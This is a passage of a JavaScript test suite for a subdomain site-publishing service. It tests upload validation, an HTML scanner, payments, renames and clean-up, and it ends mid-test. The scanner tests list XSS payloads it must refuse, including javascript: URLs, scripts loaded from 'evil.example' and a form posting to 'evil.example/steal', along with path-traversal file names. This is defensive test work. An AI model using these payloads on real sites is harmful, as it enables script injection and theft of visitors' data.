/** Publishing rules (plan 2026-10-30-publish-subdomain.md, step 3): who may publish, what files are accepted, what is refused, and that a failed publish leaves the earlier site live. */
const assert = require('assert');
const P = require('../functions/lib/publish.js');
const Fake = require('./lib/fake-sites.js');

const NOW = '2026-11-01T10:00:00.000Z';
const FUTURE = '2027-11-01T00:00:00.000Z';
const html = (body) => ({ path: 'index.html', content: '<!doctype html><title>t</title><body>' + (body || '<p>Hello</p>') + '</body>' });
const css = { path: 'style.css', content: 'body{margin:0}' };
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 1, 2, 3]).toString('base64');
const setup = (over) => {
  const f = Fake.create(); let clock = NOW;
  const pub = P.createPublisher(Object.assign({ db: f.db, bucket: f.bucket, kv: f.kv, now: () => clock }, over || {}));
  return { f, pub, setClock: (t) => { clock = t; } };
};
let count = 0;
const test = async (name, fn) => { await fn(); count++; };

(async () => {
  await test('file checks: good site, then each refusal', () => {
    const ok = P.checkFiles([html(), css, { path: 'img/logo.png', content: PNG, encoding: 'base64' }]);
    assert(ok.ok && ok.files.length === 3 && ok.files[2].bytes.length === 7 && ok.files[2].type === 'image/png');
    const bad = (files, text) => { const r = P.checkFiles(files); assert(!r.ok, text + ' should be refused'); assert(r.errors.join(' ').includes(text) || !text, text + ' → ' + r.errors.join(' | ')); };
    bad([], 'no files');
    bad([css], 'index.html');
    bad([html(), { path: '../evil.html', content: 'x' }], 'allowed file name');
    bad([html(), { path: '/abs.html', content: 'x' }], 'allowed file name');
    bad([html(), { path: 'a/./b.css', content: 'x' }], 'allowed file name');
    bad([html(), { path: '.env', content: 'x' }], 'allowed file name');
    bad([html(), { path: 'a b.css', content: 'x' }], 'allowed file name');
    bad([html(), { path: 'run.php', content: 'x' }], 'cannot be published');
    bad([html(), { path: 'x.exe', content: 'x' }], 'cannot be published');
    bad([html(), { path: 'STYLE.css', content: 'x' }, css], 'appears');
    bad([html(), { path: 'p.png', content: Buffer.from('not a png').toString('base64'), encoding: 'base64' }], 'not a real png');
    bad([html(), { path: 'p.png', content: '!!!notbase64', encoding: 'base64' }], 'could not be read');
    bad([html(), { path: 'big.css', content: 'x'.repeat(5 * 1024 * 1024 + 1) }], 'larger');
    bad([html(), ...Array.from({ length: 501 }, (_, i) => ({ path: 'f' + i + '.css', content: 'a' }))], 'Too many');
    const huge = Array.from({ length: 5 }, (_, i) => ({ path: 'b' + i + '.json', content: 'x'.repeat(4.5 * 1024 * 1024) }));
    bad([html(), ...huge], 'in total');
    bad([null, undefined, 5, { path: 7 }], '');
  });

  await test('html scan: script tricks are refused, ordinary pages pass', () => {
    const refused = [
      '<a href="javascript:alert(1)">x</a>', '<a href=" JaVa\tScRiPt:alert(1)">x</a>', '<a href="&#106;avascript:alert(1)">x</a>', '<a href="&#x6A;avascript&colon;alert(1)">x</a>',
      '<a href=\'vbscript:x\'>x</a>', '<img src="data:text/html,<script>1</script>">', '<script src="https://evil.example/x.js"></script>', '<script src=//evil.example/x.js></script>',
      '<script type="module" src="https://evil.example/m.js"></script>', '<iframe src="https://evil.example"></iframe>', '<form action="https://evil.example/steal"><input name=a></form>',
      '<form action="//evil.example"></form>', '<button formaction="https://evil.example">x</button>', '<base href="https://evil.example/">', '<object data="x.swf"></object>',
      '<embed src="x.swf">', '<meta http-equiv="refresh" content="0;url=https://evil.example">',
      '<script>document.title="x"</script>', '<script type="text/javascript">alert(1)</script>', '<script type="module">import("x")</script>', '<img src=x onerror="alert(1)">', '<body onload="x()">',
      '<a href="/" onclick="x()">a</a>', '<svg onload="x()"></svg>', '<div ONMOUSEOVER=x>', '<iframe srcdoc="<script>1</script>"></iframe>'
    ];
    for (const h of refused) assert(P.scanHtml(h).length, 'should be refused: ' + h);
    const fine = ['<a href="/about">About</a>', '<a href="https://example.com/">Elsewhere</a>', '<a href="mailto:a@b.lv">mail</a>', '<script src="/js/app.js" defer></script>', '<script type="application/ld+json">{"@type":"Thing"}</script>',
      '<img src="logo.png" alt="">', '<img src="data:image/png;base64,iVBORw0KGgo=">', '<form action="/thanks" method="post"></form>', '<link rel="stylesheet" href="style.css">', '<a href="#top">up</a>'];
    for (const h of fine) assert.deepStrictEqual(P.scanHtml(h), [], 'should pass: ' + h);
    assert.deepStrictEqual(P.scanHtml('<p>one</p><section id="on-sale" data-on="x" class="online">ok</section>'), [], 'attributes that only start with the letters "on" are not handlers');
    assert(P.scanSvg('<svg><script>alert(1)</script></svg>').length && P.scanSvg('<svg onload="x()"></svg>').length && P.scanSvg('<svg><a href="javascript:x"/></svg>').length && P.scanSvg('<svg><foreignObject/></svg>').length);
    assert.deepStrictEqual(P.scanSvg('<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>'), []);
  });

  await test('hostile pages are scanned fast (no catastrophic matching)', () => {
    const cases = ['<a ' + '"'.repeat(200000), '<a '.repeat(150000), '<a ' + '"x" '.repeat(100000), '<script '.repeat(100000), '<a href="' + '&#'.repeat(200000) + '">'];
    const t = Date.now();
    for (const c of cases) { P.scanHtml(c); P.scanSvg(c); }
    assert(Date.now() - t < 3000, 'scanning took ' + (Date.now() - t) + ' ms');
  });

  await test('scripts: without a checker none is accepted; with one, only what it approves; other pages are not affected', async () => {
    const js = (content) => ({ path: 'script.js', content });
    const plain = setup();
    plain.f.addEntitlement('u1', FUTURE);
    const noChecker = await plain.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), js('alert(1)')] });
    assert.strictEqual(noChecker.status, 400); assert(/scripts cannot be published here/.test(noChecker.json.errors[0])); assert.strictEqual(plain.f.sites.length, 0, 'nothing is created');
    const calls = [];
    const scripts = { check: async (text) => { calls.push(text); return text === 'GOOD' ? { ok: true } : { ok: false, problem: 'Not the library\'s own.' }; } };
    const withChecker = setup({ scripts });
    withChecker.f.addEntitlement('u1', FUTURE);
    const bad = await withChecker.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), js('evil()')] });
    assert.strictEqual(bad.status, 400); assert.strictEqual(bad.json.reason, 'files'); assert(/“script.js”: Not the library's own\. Reload the builder/.test(bad.json.errors[0]), bad.json.errors[0]);
    assert.strictEqual(withChecker.f.sites.length, 0, 'a refused script creates nothing and uses no paid place');
    const other = await withChecker.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), { path: 'extra/page.js', content: 'GOOD' }, js('GOOD')] });
    assert.strictEqual(other.status, 200, JSON.stringify(other.json)); assert.deepStrictEqual(calls.slice(-2), ['GOOD', 'GOOD'], 'every .js file is checked, whatever its name');
    const before = calls.length;
    assert.strictEqual((await withChecker.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), css] })).status, 200);
    assert.strictEqual(calls.length, before, 'a site with no scripts needs no check');
    const mixed = await withChecker.pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html(), js('GOOD'), { path: 'vendor/lib.js', content: 'evil()' }] });
    assert.strictEqual(mixed.status, 400, 'one bad script among good ones refuses the whole publish');
  });

  await test('entitlement states: active, grace for 14 days, ended', () => {
    const e = { status: 'active', paid_until: '2026-12-01T00:00:00Z' };
    assert.strictEqual(P.entitlementState(e, '2026-11-30T00:00:00Z'), 'active');
    assert.strictEqual(P.entitlementState(e, '2026-12-10T00:00:00Z'), 'grace');
    assert.strictEqual(P.entitlementState(e, '2026-12-16T00:00:00Z'), 'ended');
    assert.strictEqual(P.entitlementState(Object.assign({}, e, { status: 'refunded' }), '2026-11-30T00:00:00Z'), 'ended');
    assert.strictEqual(P.entitlementState(null, NOW), 'ended');
    assert.strictEqual(P.entitlementState({ status: 'active', paid_until: 'junk' }, NOW), 'ended');
  });

  await test('publish: needs sign-in, a good name, good files and a paid place', async () => {
    const { f, pub } = setup();
    assert.strictEqual((await pub.publish({ userId: null, name: 'bakery', files: [html()] })).status, 401);
    f.addEntitlement('u1', FUTURE);
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'www', files: [html()] })).json.reason, 'reserved');
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'porn', files: [html()] })).json.reason, 'blocked');
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html('<a href="javascript:x">')] })).json.reason, 'files');
    assert.strictEqual(f.sites.length, 0, 'nothing is created by a refused publish');
    const none = await pub.publish({ userId: 'u2', name: 'bakery-anna', files: [html()] });
    assert.strictEqual(none.status, 402); assert.strictEqual(none.json.reason, 'payment-needed'); assert.strictEqual(f.sites.length, 0);
  });

  await test('publish: first publish stores the files, points the name at them, uses up one paid place', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE);
    const r = await pub.publish({ userId: 'u1', name: ' Bakery-Anna ', files: [html(), css] });
    assert.strictEqual(r.status, 200); assert.strictEqual(r.json.address, 'https://bakery-anna.edvlabs.com/'); assert.strictEqual(r.json.version, 1); assert.strictEqual(r.json.created, true);
    const site = f.sites[0]; assert.strictEqual(site.status, 'live'); assert.strictEqual(site.version, 1);
    assert(f.objects.has('sites/' + site.id + '/1/index.html') && f.objects.has('sites/' + site.id + '/1/style.css'));
    assert.strictEqual(f.objects.get('sites/' + site.id + '/1/style.css').type, 'text/css; charset=utf-8');
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')), { id: site.id, version: 1, status: 'live' });
    assert.strictEqual(f.ents[0].site_id, site.id);
    const again = await pub.publish({ userId: 'u1', name: 'second-site', files: [html()] });
    assert.strictEqual(again.json.reason, 'payment-needed', 'one paid place buys one site');
  });

  await test('publish: names are exclusive; holds protect a given-up name; blocked sites stay blocked', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE); f.addEntitlement('u2', FUTURE);
    await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] });
    const taken = await pub.publish({ userId: 'u2', name: 'bakery-anna', files: [html()] });
    assert.strictEqual(taken.status, 409); assert.strictEqual(taken.json.reason, 'taken');
    assert.strictEqual(f.ents[1].site_id, null, 'a refused publish does not use the paid place');
    f.addEntitlement('u1', FUTURE);
    f.holds.push({ name: 'old-name', user_id: 'u1', expires_at: '2027-01-01T00:00:00Z' });
    assert.strictEqual((await pub.publish({ userId: 'u2', name: 'old-name', files: [html()] })).json.reason, 'taken');
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'old-name', files: [html()] })).status, 200, 'the holder may use their own held name');
    f.holds.push({ name: 'expired-name', user_id: 'u1', expires_at: '2026-01-01T00:00:00Z' });
    assert.strictEqual((await pub.publish({ userId: 'u2', name: 'expired-name', files: [html()] })).status, 200);
    f.sites.find((s) => s.name === 'bakery-anna').status = 'blocked';
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] })).status, 403);
  });

  await test('name status: free, yours, taken, held, not allowed', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE);
    await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] });
    f.holds.push({ name: 'held-name', user_id: 'u1', expires_at: '2027-01-01T00:00:00Z' });
    const s = async (u, n) => (await pub.nameStatus(u, n)).json;
    assert.strictEqual((await s('u2', 'fresh-name')).available, true);
    assert.strictEqual((await s('u2', 'bakery-anna')).reason, 'taken');
    assert.strictEqual((await s('u1', 'bakery-anna')).reason, 'yours');
    assert.strictEqual((await s('u2', 'held-name')).reason, 'taken');
    assert.strictEqual((await s('u1', 'held-name')).available, true);
    assert.strictEqual((await s('u2', 'admin')).reason, 'reserved');
    assert.strictEqual((await s('u2', 'a')).reason, 'short');
  });

  await test('update: new version, old versions pruned to the last five, other people cannot touch it', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE);
    let last;
    for (let i = 1; i <= 7; i++) last = await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html('<p>v' + i + '</p>'), css] });
    assert.strictEqual(last.json.version, 7); assert.strictEqual(last.json.created, false); assert.strictEqual(f.sites.length, 1);
    const id = f.sites[0].id, versions = [...new Set([...f.objects.keys()].filter((k) => k.startsWith('sites/' + id + '/')).map((k) => k.split('/')[2]))].sort();
    assert.deepStrictEqual(versions, ['3', '4', '5', '6', '7']);
    assert.strictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')).version, 7);
    f.addEntitlement('u2', FUTURE);
    assert.strictEqual((await pub.publish({ userId: 'u2', name: 'bakery-anna', files: [html()] })).status, 409);
  });

  await test('a failed upload leaves the earlier version live and gives the paid place back', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE);
    await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html('<p>one</p>'), css] });
    const id = f.sites[0].id;
    f.bucket.failOn = '/2/style.css';
    const bad = await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html('<p>two</p>'), css] });
    assert.strictEqual(bad.status, 500);
    assert.strictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')).version, 1, 'visitors still get version 1');
    assert(![...f.objects.keys()].some((k) => k.startsWith('sites/' + id + '/2/')), 'half-written files are removed');
    f.bucket.failOn = null;
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html('<p>three</p>')] })).json.version, 3, 'folder numbers are never reused');
    // new site whose upload fails: nothing is left behind and the paid place is free again
    f.addEntitlement('u2', FUTURE); f.bucket.failOn = 'index.html';
    const failNew = await pub.publish({ userId: 'u2', name: 'new-shop', files: [html()] });
    assert.strictEqual(failNew.status, 500); assert(!f.sites.some((s) => s.name === 'new-shop')); assert.strictEqual(f.ents[1].site_id, null); assert(!f.kvStore.has('site:new-shop'));
  });

  await test('payment: ended places refuse, grace still allows updates, new sites need an active place', async () => {
    const { f, pub, setClock } = setup(); f.addEntitlement('u1', '2026-12-01T00:00:00Z');
    await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] });
    setClock('2026-12-10T00:00:00.000Z');
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] })).status, 200, 'grace period');
    f.addEntitlement('u1', '2026-12-05T00:00:00Z');
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'second', files: [html()] })).status, 402, 'a place in its grace period cannot start a new site');
    setClock('2026-12-20T00:00:00.000Z');
    const ended = await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] });
    assert.strictEqual(ended.status, 402); assert.strictEqual(ended.json.reason, 'payment-needed');
  });

  await test('rate limit: ten publishes an hour, then the next hour is fresh', async () => {
    const { f, pub, setClock } = setup(); f.addEntitlement('u1', FUTURE);
    for (let i = 0; i < 10; i++) assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] })).status, 200);
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] })).status, 429);
    setClock('2026-11-01T11:00:00.000Z');
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] })).status, 200);
  });

  await test('site cap per account is explained, and two people racing for one name get one winner', async () => {
    const { f, pub, setClock } = setup();
    for (let i = 0; i < 10; i++) { f.addEntitlement('u1', FUTURE); assert.strictEqual((await pub.publish({ userId: 'u1', name: 'shop-' + i + 'x', files: [html()] })).status, 200); }
    f.addEntitlement('u1', FUTURE); setClock('2026-11-01T12:00:00.000Z'); // a new hour, so the hourly limit is not what answers
    const eleven = await pub.publish({ userId: 'u1', name: 'one-too-many', files: [html()] });
    assert.strictEqual(eleven.json.reason, 'too-many');
    const g = setup(); g.f.addEntitlement('a', FUTURE); g.f.addEntitlement('b', FUTURE);
    const both = await Promise.all([g.pub.publish({ userId: 'a', name: 'same-name', files: [html()] }), g.pub.publish({ userId: 'b', name: 'same-name', files: [html()] })]);
    assert.deepStrictEqual(both.map((x) => x.status).sort(), [200, 409]);
  });

  await test('unpublish: owner only; the files stay; publishing again brings it back', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE);
    const r = await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] });
    assert.strictEqual((await pub.unpublish({ userId: 'u2', siteId: r.json.siteId })).status, 404);
    assert.strictEqual((await pub.unpublish({ userId: null, siteId: r.json.siteId })).status, 401);
    assert.strictEqual((await pub.unpublish({ userId: 'u1', siteId: r.json.siteId })).status, 200);
    assert.strictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')).status, 'unpublished'); assert.strictEqual(f.sites[0].status, 'unpublished');
    assert([...f.objects.keys()].some((k) => k.endsWith('/1/index.html')));
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] })).status, 200);
    assert.strictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')).status, 'live');
    f.sites[0].status = 'blocked';
    assert.strictEqual((await pub.unpublish({ userId: 'u1', siteId: r.json.siteId })).status, 403, 'a blocked site cannot be changed by its owner');
  });

  await test('mySites lists a person\'s sites with payment state and unused places', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE); f.addEntitlement('u1', FUTURE);
    await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] });
    const r = await pub.mySites('u1');
    assert.strictEqual(r.json.freePlaces, 1); assert.strictEqual(r.json.sites.length, 1);
    assert.deepStrictEqual(Object.keys(r.json.sites[0]).sort(), ['address', 'id', 'name', 'paidUntil', 'payment', 'publishedAt', 'status', 'version']);
    assert.strictEqual(r.json.sites[0].address, 'https://bakery-anna.edvlabs.com/'); assert.strictEqual(r.json.sites[0].payment, 'active');
    assert.strictEqual((await pub.mySites('u2')).json.sites.length, 0, 'nobody sees another person\'s sites');
    assert.strictEqual((await pub.mySites(null)).status, 401);
  });

  await test('sweep: deleted accounts\' sites vanish, lapsed payments go offline, old holds are released; a second run changes nothing', async () => {
    const { f, pub, setClock } = setup();
    f.addEntitlement('u1', '2026-12-01T00:00:00Z'); f.addEntitlement('u2', FUTURE);
    await pub.publish({ userId: 'u1', name: 'lapsing-shop', files: [html()] });
    await pub.publish({ userId: 'u2', name: 'gone-shop', files: [html()] });
    const goneId = f.sites.find((x) => x.name === 'gone-shop').id;
    f.sites.splice(f.sites.findIndex((x) => x.name === 'gone-shop'), 1); // the account was deleted: the database rows are gone, KV and R2 are not
    f.kvStore.set('site:renamed-away', JSON.stringify({ redirect: 'lapsing-shop' }));
    f.holds.push({ name: 'renamed-away', user_id: 'u1', expires_at: '2026-11-15T00:00:00Z' });
    f.kvStore.set('site:stale-redirect', JSON.stringify({ redirect: 'lapsing-shop' })); // a redirect with no hold behind it
    let r = await pub.sweep();
    assert.deepStrictEqual(r, { orphans: 1, lapsed: 0, holds: 1, blocked: 0, repaired: 0, purged: 0, strays: 0 }, JSON.stringify(r));
    assert(!f.kvStore.has('site:gone-shop') && ![...f.objects.keys()].some((k) => k.startsWith('sites/' + goneId + '/')), 'the deleted account\'s site is gone from KV and R2');
    assert(f.kvStore.has('site:renamed-away'), 'a held redirect stays while the hold lasts');
    assert(f.sites.find((x) => x.name === 'lapsing-shop').status === 'live', 'still paid or in grace');
    setClock('2026-12-10T00:00:00.000Z'); // grace
    assert.deepStrictEqual(await pub.sweep(), { orphans: 0, lapsed: 0, holds: 1, blocked: 0, repaired: 0, purged: 0, strays: 0 }, 'the hold is now over (15 Nov), grace keeps the site live');
    assert(!f.kvStore.has('site:renamed-away') && f.holds.length === 0, 'expired hold released with its redirect');
    setClock('2026-12-20T00:00:00.000Z'); // 19 days after payment ended: grace is over
    r = await pub.sweep();
    assert.strictEqual(r.lapsed, 1); assert.strictEqual(f.sites[0].status, 'unpublished'); assert.strictEqual(JSON.parse(f.kvStore.get('site:lapsing-shop')).status, 'unpublished');
    assert([...f.objects.keys()].some((k) => k.endsWith('/index.html')), 'the files are kept so renewing brings the site back');
    assert.deepStrictEqual(await pub.sweep(), { orphans: 0, lapsed: 0, holds: 0, blocked: 0, repaired: 0, purged: 0, strays: 0 }, 'running again changes nothing');
  });

  await test('sweep: a site the owner blocked in the database stops being served within the hour; blocking is not undone by the sweep', async () => {
    const { f, pub } = setup(); f.addEntitlement('u1', FUTURE);
    await pub.publish({ userId: 'u1', name: 'bad-shop', files: [html()] });
    f.sites[0].status = 'blocked'; // what scripts/block-site.js does to the database
    assert.strictEqual(JSON.parse(f.kvStore.get('site:bad-shop')).status, 'live', 'until the sweep runs it is still served');
    assert.strictEqual((await pub.sweep()).blocked, 1);
    assert.strictEqual(JSON.parse(f.kvStore.get('site:bad-shop')).status, 'blocked');
    assert.strictEqual((await pub.sweep()).blocked, 0, 'nothing more to do the second time');
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'bad-shop', files: [html()] })).status, 403, 'the owner cannot publish it back');
    assert.strictEqual(f.sites[0].status, 'blocked');
  });

  await test('rename: new name serves the site, old name redirects and is held for the owner, files do not move, rules are enforced', async () => {
    const { f, pub, setClock } = setup(); f.addEntitlement('u1', FUTURE); f.addEntitlement('u2', FUTURE);
    const made = await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html('<p>Anna</p>'), css] });
    const id = made.json.siteId, filesBefore = [...f.objects.keys()].sort();
    const r = await pub.rename({ userId: 'u1', siteId: id, newName: ' Anna-Bakery ' });
    assert.strictEqual(r.status, 200, JSON.stringify(r.json)); assert.strictEqual(r.json.name, 'anna-bakery'); assert.strictEqual(r.json.oldName, 'bakery-anna');
    assert.strictEqual(r.json.address, 'https://anna-bakery.edvlabs.com/'); assert.strictEqual(r.json.oldAddress, 'https://bakery-anna.edvlabs.com/'); assert.strictEqual(r.json.holdDays, 90);
    assert.strictEqual(f.sites[0].name, 'anna-bakery');
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:anna-bakery')), { id, version: 1, status: 'live' });
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')), { redirect: 'anna-bakery' });
    assert.deepStrictEqual([...f.objects.keys()].sort(), filesBefore, 'renaming copies and moves no files');
    const hold = f.holds.find((h) => h.name === 'bakery-anna'); assert(hold && hold.user_id === 'u1' && hold.redirect_to === 'anna-bakery' && new Date(hold.expires_at) > new Date('2027-01-20'), 'the old name is held for 90 days');
    // the old name is not free for others, but is for its owner
    assert.strictEqual((await pub.nameStatus('u2', 'bakery-anna')).json.reason, 'taken');
    assert.strictEqual((await pub.publish({ userId: 'u2', name: 'bakery-anna', files: [html()] })).status, 409);
    assert.strictEqual((await pub.nameStatus('u1', 'bakery-anna')).json.available, true);
    // a second rename: the older held name is pointed at the newest name (no chains)
    const r2 = await pub.rename({ userId: 'u1', siteId: id, newName: 'anna-cakes' }); assert.strictEqual(r2.status, 200);
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')), { redirect: 'anna-cakes' }); assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:anna-bakery')), { redirect: 'anna-cakes' });
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:anna-cakes')), { id, version: 1, status: 'live' });
    // twice in 30 days is the limit
    const r3 = await pub.rename({ userId: 'u1', siteId: id, newName: 'third-name' }); assert.strictEqual(r3.status, 429); assert.strictEqual(r3.json.reason, 'renames'); assert.strictEqual(f.sites[0].name, 'anna-cakes');
    setClock('2026-12-05T10:00:00.000Z');
    assert.strictEqual((await pub.rename({ userId: 'u1', siteId: id, newName: 'third-name' })).status, 200, 'after 30 days it is allowed again');
    // renaming back to a name of one's own hold works
    f.addEntitlement('u1', '2028-01-01T00:00:00Z');
    assert.strictEqual(f.sites[0].name, 'third-name');
    // publishing again after a rename keeps serving from the new name
    assert.strictEqual((await pub.publish({ userId: 'u1', name: 'third-name', files: [html('<p>v2</p>')] })).json.version, 2);
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:third-name')), { id, version: 2, status: 'live' });
  });

  await test('rename: refusals leave everything as it was', async () => {
    const { f, pub, setClock } = setup(); f.addEntitlement('u1', '2026-12-01T00:00:00Z'); f.addEntitlement('u2', FUTURE); f.addEntitlement('u1', FUTURE);
    const a = (await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] })).json.siteId;
    const b = (await pub.publish({ userId: 'u2', name: 'ben-shop', files: [html()] })).json.siteId;
    const snapshot = () => JSON.stringify([f.sites, f.holds, [...f.kvStore.entries()]]);
    const before = snapshot();
    const cases = [[{ userId: null, siteId: a, newName: 'fresh-name' }, 401], [{ userId: 'u1', siteId: a, newName: 'www' }, 400], [{ userId: 'u1', siteId: a, newName: 'p0rn' }, 400], [{ userId: 'u1', siteId: a, newName: 'bakery-anna' }, 400],
      [{ userId: 'u1', siteId: a, newName: 'ben-shop' }, 409], [{ userId: 'u2', siteId: a, newName: 'fresh-name' }, 404], [{ userId: 'u1', siteId: 'no-such-site', newName: 'fresh-name' }, 404], [{ userId: 'u1', siteId: b, newName: 'fresh-name' }, 404]];
    for (const [args, status] of cases) assert.strictEqual((await pub.rename(args)).status, status, JSON.stringify(args));
    f.holds.push({ name: 'held-by-ben', user_id: 'u2', site_id: null, redirect_to: null, expires_at: '2027-02-01T00:00:00Z' });
    assert.strictEqual((await pub.rename({ userId: 'u1', siteId: a, newName: 'held-by-ben' })).status, 409, 'someone else\'s held name');
    f.holds.pop(); const afterRefusals = snapshot(); assert.strictEqual(afterRefusals, before, 'nothing changed by any refusal');
    f.sites.find((s) => s.id === a).status = 'blocked'; assert.strictEqual((await pub.rename({ userId: 'u1', siteId: a, newName: 'fresh-name' })).status, 403); f.sites.find((s) => s.id === a).status = 'live';
    f.holds.push({ name: 'expired-hold', user_id: 'u2', site_id: null, redirect_to: null, expires_at: '2026-01-01T00:00:00Z' });
    assert.strictEqual((await pub.rename({ userId: 'u1', siteId: a, newName: 'expired-hold' })).status, 200, 'a hold that ran out is free');
    setClock('2026-12-20T00:00:00.000Z'); // payment of a's place ended more than 14 days ago
    const c = f.addEntitlement('u1', '2026-12-01T00:00:00Z', { status: 'active' }); assert(c);
    f.ents.find((e) => e.site_id === a).paid_until = '2026-12-01T00:00:00Z';
    assert.strictEqual((await pub.rename({ userId: 'u1', siteId: a, newName: 'another-new' })).json.reason, 'payment-needed');
  });

  await test('rename: a lookup update that fails after the database change is repaired by the next clean-up', async () => {
    const { f, pub, setClock } = setup(); f.addEntitlement('u1', FUTURE);
    const id = (await pub.publish({ userId: 'u1', name: 'bakery-anna', files: [html()] })).json.siteId;
    const realPut = f.kv.put; f.kv.put = async (k, v, o) => { if (k.startsWith('site:')) throw new Error('kv down'); return realPut(k, v, o); }; // the lookup is down, the rate counter is not
    const r = await pub.rename({ userId: 'u1', siteId: id, newName: 'anna-bakery' });
    f.kv.put = realPut;
    assert.strictEqual(r.status, 202); assert(r.json.pending); assert.strictEqual(f.sites[0].name, 'anna-bakery', 'the database already has the new name');
    assert.strictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')).status, 'live', 'until the clean-up the lookup is as it was');
    setClock('2026-11-01T11:00:00.000Z');
    const out = await pub.sweep(); assert(out.repaired >= 2, JSON.stringify(out));
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:anna-bakery')), { id, version: 1, status: 'live' }); assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:bakery-anna')), { redirect: 'anna-bakery' });
    assert.strictEqual((await pub.sweep()).repaired, 0, 'and a second run changes nothing');
    // the clean-up never moves a lookup backwards
    f.kvStore.set('site:anna-bakery', JSON.stringify({ id, version: 9, status: 'live' }));
    await pub.sweep(); assert.strictEqual(JSON.parse(f.kvStore.get('site:anna-bakery')).version, 9);
  });

  await test('cleanup of lapsed sites: files go only after grace plus 90 days, only when payment ended, and the site can be published again', async () => {
    const { f, pub, setClock } = setup();
    f.addEntitlement('u1', '2026-12-01T00:00:00Z'); f.addEntitlement('u2', '2030-01-01T00:00:00Z'); f.addEntitlement('u3', '2026-12-01T00:00:00Z'); f.addEntitlement('u4', '2026-12-01T00:00:00Z');
    const lapse = (await pub.publish({ userId: 'u1', name: 'lapsing-shop', files: [html('<p>one</p>'), css] })).json.siteId;
    const keep = (await pub.publish({ userId: 'u2', name: 'paid-but-offline', files: [html()] })).json.siteId;
    const blocked = (await pub.publish({ userId: 'u3', name: 'blocked-shop', files: [html()] })).json.siteId;
    const bare = (await pub.publish({ userId: 'u4', name: 'owner-made', files: [html()] })).json.siteId;
    await pub.unpublish({ userId: 'u2', siteId: keep });
    f.sites.find((x) => x.id === blocked).status = 'blocked';
    f.ents.splice(f.ents.findIndex((e) => e.site_id === bare), 1); // a site with no paid place at all (made by the owner)
    const files = (id) => [...f.objects.keys()].filter((k) => k.startsWith('sites/' + id + '/')).length;
    setClock('2026-12-20T00:00:00.000Z'); const first = await pub.sweep(); assert.strictEqual(first.lapsed, 1, 'only lapsing-shop goes offline now: the blocked site is not live, the owner-made one has no paid place, the other is paid');
    assert.strictEqual(f.sites.find((x) => x.id === lapse).status, 'unpublished');
    setClock('2027-03-10T00:00:00.000Z'); assert.strictEqual((await pub.sweep()).purged, 0, '99 days after payment ended: still inside the 104 days'); assert(files(lapse) > 0);
    setClock('2027-03-16T00:00:00.000Z'); const out = await pub.sweep(); assert.strictEqual(out.purged, 1, JSON.stringify(out));
    assert.strictEqual(files(lapse), 0, 'its files are gone'); assert.strictEqual(f.sites.find((x) => x.id === lapse).version, 0); assert.strictEqual(f.sites.find((x) => x.id === lapse).name, 'lapsing-shop', 'the name and the row stay');
    assert.deepStrictEqual(JSON.parse(f.kvStore.get('site:lapsing-shop')), { id: lapse, version: 0, status: 'unpublished' });
    assert(files(keep) > 0 && files(blocked) > 0 && files(bare) > 0, 'offline by the owner with payment active, blocked, and no-entitlement sites keep their files');
    assert.strictEqual((await pub.sweep()).purged, 0, 'a second run changes nothing');
    f.ents.find((e) => e.site_id === lapse).paid_until = '2028-06-01T00:00:00Z'; // the person renews
    const again = await pub.publish({ userId: 'u1', name: 'lapsing-shop', files: [html('<p>back</p>')] });
